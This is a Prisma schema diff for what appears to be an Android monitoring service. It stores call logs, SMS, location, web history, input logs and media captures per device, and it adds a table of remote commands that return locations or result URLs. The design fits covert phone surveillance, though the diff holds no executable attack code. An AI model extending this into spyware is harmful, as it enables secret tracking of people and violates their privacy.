@@ -20,26 +20,47 @@ model User {
 }
 
 model Device {
-  id            String         @id @default(cuid())
-  userId        String
-  user          User           @relation(fields: [userId], references: [id], onDelete: Cascade)
-  deviceName    String
-  androidId     String         @unique
-  deviceToken   String         @unique
-  apkVersion    String         @default("1.0.0")
-  lastSeen      DateTime?
-  isActive      Boolean        @default(true)
-  createdAt     DateTime       @default(now())
-  callLogs      CallLog[]
-  smsMessages   SmsMessage[]
-  notifications Notification[]
-  locations     Location[]
-  appUsages     AppUsage[]
-  webHistories  WebHistory[]
-  inputLogs     InputLog[]
-  mediaCaptures MediaCapture[]
+  id               String          @id @default(cuid())
+  userId           String
+  user             User            @relation(fields: [userId], references: [id], onDelete: Cascade)
+  deviceName       String
+  androidId        String          @unique
+  deviceToken      String          @unique
+  apkVersion       String          @default("1.0.0")
+  manufacturer     String?
+  model            String?
+  permissionStatus String?
+  lastSeen         DateTime?
+  isActive         Boolean         @default(true)
+  createdAt        DateTime        @default(now())
+  callLogs         CallLog[]
+  smsMessages      SmsMessage[]
+  notifications    Notification[]
+  locations        Location[]
+  appUsages        AppUsage[]
+  webHistories     WebHistory[]
+  inputLogs        InputLog[]
+  mediaCaptures    MediaCapture[]
+  commands         DeviceCommand[]
 
   @@index([userId])
+}
+
+model DeviceCommand {
+  id          String    @id @default(cuid())
+  deviceId    String
+  device      Device    @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  type        String
+  status      String    @default("pending")
+  resultUrl   String?
+  resultLat   Float?
+  resultLng   Float?
+  resultAcc   Float?
+  errorMsg    String?
+  createdAt   DateTime  @default(now())
+  completedAt DateTime?
+
+  @@index([deviceId, status])
 }
 
 model CallLog {
